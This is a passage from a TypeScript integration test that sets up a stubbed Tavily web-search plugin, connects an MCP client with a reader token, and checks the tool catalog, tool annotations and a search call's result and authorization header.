    origin: 'https://api.tavily.com',
    timeoutMs: 30_000,
    maxResponseBytes: 8 * 1024 * 1024,
    maxInFlight: 8,
    queueMs: 15_000,
    dailyCallsPerProject: 200,
    dailyCalls: 1000,
    fallbackDailyCalls: 200,
  });
  web.config = { ...web.config, origin: tavily.origin };

  const previous = process.env.MERV_TAVILY_API_KEY;
  process.env.MERV_TAVILY_API_KEY = key;
  const directory = mkdtempSync(join(tmpdir(), 'merv-web-app-'));
  const composition = loadConfiguration({ directory, api: true, port: 0 }).entries;
  const app = await createApp({ directory, config: { plugins: [...composition, ...entries] } });
  let mcp: Client | undefined;
  t.after(async () => {
    await mcp?.close();
    await app.stop();
    rmSync(directory, { recursive: true, force: true });
    if (previous === undefined) delete process.env.MERV_TAVILY_API_KEY;
    else process.env.MERV_TAVILY_API_KEY = previous;
  });
  const boot = await app.ctx.scope.bootstrap({ projectName: 'Web', actorName: 'Owner' });
  const owner = { actorId: boot.actor.id, projectId: boot.project.id };
  const issued = await app.ctx.scope.issueActor(owner, { name: 'Reader', role: 'reader' });
  mcp = new Client({ name: 'merv-web-test', version: '1.0.0' });
  await mcp.connect(
    new StreamableHTTPClientTransport(new URL(app.ctx.api.url! + '/mcp'), {
      requestInit: { headers: { Authorization: `Bearer ${issued.token}` } },
    }),
  );
  const catalog = (await mcp.listTools()).tools;
  // The default composition's 94 tools, and these two.
  assert.equal(catalog.length, 96);
  for (const name of ['web.search', 'web.extract'])
    assert.deepEqual(catalog.find((tool) => tool.name === name)?.annotations, {
      readOnlyHint: true,
      openWorldHint: true,
    });
  const called = await mcp.callTool({ name: 'web.search', arguments: { query: 'merv' } });
  assert.equal(called.isError, undefined, JSON.stringify(called.content));
  const result = JSON.parse((called.content as { text: string }[])[0].text) as WebSearch;
  assert.deepEqual(result.results[0].url, 'https://example.com/0');
  assert.equal(tavily.seen[0].headers.authorization, `Bearer ${key}`);
});
